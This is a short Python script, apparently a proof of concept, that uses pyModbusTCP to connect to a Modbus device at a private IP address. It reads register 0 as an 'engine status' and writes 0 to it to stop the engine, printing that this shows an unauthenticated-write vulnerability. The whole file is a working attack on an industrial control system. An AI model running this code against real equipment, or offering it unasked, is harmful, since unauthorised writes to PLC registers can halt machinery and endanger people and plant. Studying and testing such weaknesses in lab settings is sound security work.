from pyModbusTCP.client import ModbusClient
import time

def stop_engine(host='192.168.0.181', port=502):
    print(f"Attempting to stop engine at {host}:{port}")
    
    # Create Modbus client
    client = ModbusClient(host=host, port=port, auto_open=True)
    
    try:
        # First try to read the current status
        print("Reading current engine status...")
        status = client.read_holding_registers(0, 1)
        if status:
            print(f"Current engine status: {status[0]}")
        else:
            print("Failed to read engine status")
            return
            
        # Write 0 to status register (register 0)
        print("Sending stop command...")
        success = client.write_single_register(0, 0)
        if success:
            print("Successfully sent stop command!")
            print("This demonstrates the security vulnerability - no authentication required.")
            
            # Verify the write
            time.sleep(0.1)  # Small delay
            new_status = client.read_holding_registers(0, 1)
            if new_status:
                print(f"New engine status: {new_status[0]}")
        else:
            print("Failed to send stop command")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    stop_engine() 